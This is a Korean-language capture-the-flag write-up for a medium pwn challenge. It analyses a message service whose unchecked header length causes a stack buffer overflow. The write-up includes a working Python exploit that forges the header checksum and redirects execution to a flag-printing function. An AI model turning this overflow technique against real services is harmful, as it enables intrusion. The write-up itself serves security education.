---
ctf_name: "PUTCyberDays 2026"
challenge_name: "p2p"
category: "pwn"
difficulty: "medium"
author: "laneeeey"
date: "2026-04-12"
points: 439
tags: [bof]
---

# 문제명

## 문제 설명

> 접속 정보와 실행 파일이 제공된 pwn 문제

- 접속 정보: nc p2p.putcyberdays.pl 8080
- 제공 파일: server

## 풀이

### 분석

서비스는 메뉴 기반 인터페이스를 제공한다.

1. Send Message  
2. Read Conversation  
3. Exit

Send Message 선택시 메시지를 입력받고 단순 문자열을 입력하면 Failed to read header가 출력된다. 이를 통해 프로그램이 일반 문자열이 아닌 특정한 형식의 데이터를 요구한다는 것을 알 수 있다.

여러 시도 후 입력은 고정된 크기의 헤더를 포함해야 하며 헤더가 정상적으로 파싱되지 않으면 위와 같은 에러가 발생한다.

제공된 실행 파일을 분석해 메시지 전송 시 먼저 12바이트 크기의 헤더를 읽는 것을 확인할 수 있었다.

```c
struct header {
    uint32_t magic;
    uint32_t length;
    uint32_t checksum;
};
```

magic: 패킷 유효성 확인, 0xcafebabe와 일치해야 한다.
length: 메시지의 길이, 최대 0x400까지 허용된다.
checksum: 무결성 검증 값, 별도 함수로 계산된다.

각 필드를 모두 만족해야 헤더 검증에 성공해 정상적인 메시지가 나온다.

### 취약점

프로그램은 헤더 검증 후 입력된 메시지를 내부 버퍼에 복사한다.

디컴파일 결과 memcpy(rbp-0x50, msg, len);가 존재한다.

len은 헤더에서 전달된 값으로 0x400까지 설정할 수 있지만 버퍼의 크기가 더 작아 len을 크게 설정할 경우 버퍼를 초과해 데이터가 복사된다.

이로 인해 stack buffer overflow가 발생하며 RIP를 덮어쓸 수 있다.

### 익스플로잇

먼저 서비스와 바이너리를 분석하여 메시지 전송 시 헤더와 본문이 함께 처리되는 것을 확인했다. 또한 헤더에는 magic, length, checksum 필드가 포함되어 올바른 값을 넣어야 검증을 통과할 수 있었다.

디컴파일을 통해 헤더 검증 후에는 입력 메시지가 버퍼로 복사되는 것을 확인했다. 또 len값을 크게 설정하면 스택 버퍼를 초과하여 반환 주소까지 덮어쓸 수 있다는 것을 알 수 있었다.

버퍼를 채우기 위해 반환주소 전까지는 더미 데이터로 채우고 원하는 주소를 넣는 방식으로 페이로드를 구성했다.

반환 주소는 바이너리 내부에서 system("cat flag.txt")을 호출하는 위치인 0x40120a로 설정하면 플래그를 출력할 수 있다.

페이로드에 대한 checksum을 계산한 후 magic, length, checksum이 포함된 헤더와 버퍼 오버플로우를 일으키는 페이로드를 함께 전송했다.

그 결과 system("cat flag.txt") 호출 지점으로 이동하면서 flag.txt 내용이 출력되었다.

```python
import socket
import struct

HOST = "p2p.putcyberdays.pl"
PORT = 8080

def checksum(data):
    c = 0x12345678
    for i, b in enumerate(data):
        if b >= 128:
            b -= 256
        c ^= ((b & 0xffffffff) << (i & 3)) & 0xffffffff
        c = ((c << 5) | (c >> 27)) & 0xffffffff
    return c & 0xffffffff

payload = b"A" * 88 + struct.pack("<Q", 0x40120a)
hdr = struct.pack("<III", 0xcafebabe, len(payload), checksum(payload))

with socket.create_connection((HOST, PORT)) as s:
    s.recv(1024)
    s.sendall(b"1\n")
    s.recv(1024)
    s.sendall(b"user\n")
    s.recv(1024)
    s.sendall(hdr + payload)

    print(s.recv(4096))
```

## 플래그

```
flag{REDACTED}
```

## 배운 점
- 디컴파일을 통해 프로그램의 동작을 분석하고 입력 값이 실제로 어떻게 처리되는지를 구체적으로 파악할 수 있었다.
- 비교적 단순한 취약점이라도 입력 검증 로직과 결합되면 문제 해결 난이도가 높아질 수 있음을 이해하게 되었다.